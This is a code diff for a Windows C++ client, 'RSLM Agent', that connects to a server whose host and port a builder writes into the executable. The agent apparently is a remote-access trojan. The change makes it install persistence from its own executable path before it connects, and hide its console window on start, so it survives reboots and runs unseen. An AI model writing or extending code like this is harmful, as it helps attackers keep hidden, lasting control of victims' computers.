@@ -8,8 +8,9 @@
 #include "Message.h"
 #include "MessageFramer.h"
 #include "Settings.h"
-#include "Globals.h"           // ← NOUVEAU : pour les placeholders
+#include "Globals.h"
 #include "AgentMessageDispatcher.h"
+#include "PersistenceHandler.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <gdiplus.h>
@@ -51,7 +52,6 @@ int main() {
 
     // ============================================================
     // UTILISER LES PLACEHOLDERS DU BUILDER
-    // Ces valeurs seront modifiées par le builder dans l'EXE final
     // ============================================================
 
     std::string serverHost = std::string(client::config::g_serverHost);
@@ -60,10 +60,26 @@ int main() {
     bool hideOnStart = client::config::g_hideOnStart;
 
     // ============================================================
+    // PERSISTANCE - S'installe AVANT de se connecter
+    // ============================================================
+    if (enablePersistence) {
+        std::cout << "[RSLM Agent] Installing persistence..." << std::endl;
+
+        // Récupérer le chemin de l'exe courant
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
+
+        client::messages::PersistenceHandler::InstallAll(std::string(exePath));
+    }
+
+    // ============================================================
+    // CACHER LA FENÊTRE SI DEMANDÉ
+    // ============================================================
+    if (hideOnStart) {
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+    }
 
     client::config::Settings settings;
-
-    // Écraser les valeurs avec les placeholders
     settings.serverHost = serverHost;
     settings.serverPort = static_cast<uint16_t>(serverPort);
     settings.autoStart = enablePersistence;
